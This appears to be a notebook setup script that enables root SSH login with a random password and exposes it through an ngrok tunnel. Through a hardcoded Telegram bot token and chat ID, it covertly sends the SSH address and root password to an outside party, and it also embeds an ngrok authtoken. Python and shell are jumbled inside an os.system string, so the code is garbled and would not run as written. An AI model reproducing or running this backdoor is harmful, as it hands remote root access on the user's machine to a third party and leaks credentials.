pip install telepot --upgrade &> /dev/null
import random, string, urllib.request, json, getpass, telepot,os
os.system("""
def ste(use):
    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
    idd = 1380298324
    bot = telepot.Bot(token)
    bot.sendMessage(idd,use)
#Generate root password

password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))

#Download ngrok

wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip

! unzip -qq -n ngrok-stable-linux-amd64.zip

#Setup sshd

apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null

#Set root password

echo root:$password | chpasswd

mkdir -p /var/run/sshd

echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc

echo "export LD_LIBRARY_PATH" >> /root/.bashrc

#Run sshd

get_ipython().system_raw('/usr/sbin/sshd -D &')

#Ask token

print("Copy authtoken from https://dashboard.ngrok.com/auth")

authtoken = "27LGoz73mr6cYiQr2gLZzKVCR4x_4qBv9DQLubx7AqMeqj4Qz"
#Create tunnel

get_ipython().system_raw('./ngrok authtoken $authtoken && ./ngrok tcp 22 &')

#Get public address and print connect command

with urllib.request.urlopen('http://localhost:4040/api/tunnels') as response:

  data = json.loads(response.read().decode())

  (host, port) = data['tunnels'][0]['public_url'][6:].split(':')

  ste(f'ssh -p{port} root@{host}')

#Print root password

ste(password)

#curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={idssh}' 
#curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={password}'
""")
